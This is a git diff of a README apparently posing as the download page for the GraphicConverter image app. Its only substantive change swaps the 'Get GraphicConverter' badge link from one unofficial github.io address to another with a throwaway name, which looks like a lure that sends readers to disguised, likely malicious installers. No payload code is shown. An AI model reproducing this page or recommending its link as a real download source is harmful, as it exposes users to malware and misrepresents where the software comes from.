@@ -1,11 +1,11 @@
 # GraphicConverter – Powerful Image Management & Conversion Tool  
 
 <div align="center">  
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/11/0e/54/110e5447-9bb5-a151-138b-d49c3f5ca279/AppIcon-0-0-85-220-0-0-5-0-2x.png/1200x630bb.png" alt="GraphicConverter Logo" width="800">  
+<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/11/0e/54/110e5447-9bb5-a151-138b-d49c3f5ca279/AppIcon-0-0-85-220-0-0-5-0-2x.png/1200x630bb.png" alt="GraphicConverter Logo" width="400">  
 </div>  
 
 <div align="center">  
-<a href="https://install-quick-software.github.io/.github/graphicconverter">  
+<a href="https://tubus-jubus-apps.github.io/.github/graphicconverter">  
 <img src="https://img.shields.io/badge/⬇️_Get_GraphicConverter-blue?style=for-the-badge&logo=apple" alt="Get GraphicConverter">  
 </a>  
 </div>  
